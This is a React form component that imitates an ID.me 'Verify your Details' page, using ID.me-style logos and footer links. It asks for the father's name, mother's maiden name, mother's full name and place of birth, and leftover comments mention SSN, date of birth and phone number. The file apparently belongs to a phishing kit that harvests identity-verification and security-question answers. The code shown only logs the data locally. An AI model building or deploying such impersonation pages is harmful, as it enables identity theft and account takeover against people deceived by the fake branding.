import React, { useState } from "react";
import id from "../assets/id.png";
import download from "../assets/download2.png";
import DatePicker from "react-datepicker";
import "react-datepicker/dist/react-datepicker.css";
import { useNavigate } from "react-router-dom";

const Personal = () => {
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    father: "",
    mother: "",
    mothers: "",
    place: "",
  });

  const [errors, setErrors] = useState({
    father: false,
    mother: false,
    mothers: false,
    place: false,
  });

  const [currentErrorField, setCurrentErrorField] = useState(null);

  const validateField = (fieldName) => {
    let isValid = formData[fieldName].trim() !== "";
    setErrors((prev) => ({ ...prev, [fieldName]: !isValid }));
    return isValid;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!validateField("father")) {
      setCurrentErrorField("father");
      return;
    }

    if (!validateField("mother")) {
      setCurrentErrorField("mother");
      return;
    }

    if (!validateField("mothers")) {
      setCurrentErrorField("mothers");
      return;
    }

    if (!validateField("place")) {
      setCurrentErrorField("place");
      return;
    }

    // All fields valid
    setCurrentErrorField(null);
    console.log("Form submitted:", formData);
    navigate("/success");
  };

  return (
    <div className="flex flex-col min-h-screen bg-[#ffffff]">
      {/* Header */}
      <div className="w-full h-28 bg-white shadow-md flex justify-center items-center space-x-2 p-2 sm:bg-white bg-gradient-to-b from-[#ffffff] to-[#f2f1f1]">
        <img src={id} alt="User ID Icon" className="w-20" />
        <h1 className="text-lg font-bold">+</h1>
        <img src={download} alt="Download Icon" className="w-24" />
      </div>

      <div className="w-full gap-3 max-w-[500px] bg-white px-4 py-6 sm:px-8 sm:py-10 rounded-xl shadow-lg border border-gray-300 mx-auto flex flex-col items-center">
        <h1 className="text-2xl sm:text-xl font-bold text-center mb-4 sm:mb-8">
          Verify your Details
        </h1>

        <form
          onSubmit={handleSubmit}
          className="flex flex-col items-center space-y-7 w-full max-w-md mx-auto"
        >
          {/* Full Name */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">
              Fathers First and Lastname
            </label>
            <input
              name="father"
              type="text"
              value={formData.father}
              onChange={handleChange}
              onBlur={() =>
                currentErrorField === "father" && validateField("father")
              }
              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.father
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-300 focus:ring-2 focus:ring-blue-600"
              }`}
            />
            {errors.father && (
              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
            )}
          </div>

          {/* Date of Birth */}

          {/* SSN */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">
              Mothers Maiden Name
            </label>
            <input
              name="mother"
              type="text"
              value={formData.mother}
              onChange={handleChange}
              onBlur={() =>
                currentErrorField === "mother" && validateField("mother")
              }
              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.mother
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
              }`}
            />
            {errors.mother && (
              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
            )}
          </div>

          {/* Phone Number */}
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">
              Mother's First Name and Lastname
            </label>
            <input
              name="mothers"
              type="text"
              value={formData.mothers}
              onChange={handleChange}
              onBlur={() =>
                currentErrorField === "mothers" && validateField("mothers")
              }
              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.mothers
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
              }`}
            />
            {errors.mothers && (
              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
            )}
          </div>
          <div className="w-full">
            <label className="text-md font-semibold mb-2 block">
              Place of Birth (City and State of Birth)
            </label>
            <input
              name="place"
              type="text"
              value={formData.place}
              onChange={handleChange}
              onBlur={() =>
                currentErrorField === "place" && validateField("place")
              }
              className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.place
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
              }`}
            />
            {errors.place && (
              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
            )}
          </div>

          <button
            type="submit"
            className="w-full py-3 sm:py-4 bg-blue-700 text-white rounded-lg mt-2 hover:bg-blue-800 transition-colors text-sm sm:text-lg"
          >
            Continue
          </button>
        </form>
      </div>

      {/* Footer */}
      <footer className="w-full shadow-md bg-[#f5f5f5] flex flex-col items-center justify-center p-4 text-xs sm:text-sm text-[#2e3f5b] space-y-2">
        <div className="underline text-blue-600 cursor-pointer">English</div>
        <div className="flex flex-wrap items-center justify-center gap-2 sm:gap-4 text-center cursor-pointer">
          <span>What is ID.me?</span>
          <span className="border-l border-black h-3" />
          <span>Terms of Service</span>
          <span className="border-l border-black h-3" />
          <span>Privacy Policy</span>
        </div>
      </footer>
    </div>
  );
};

export default Personal;
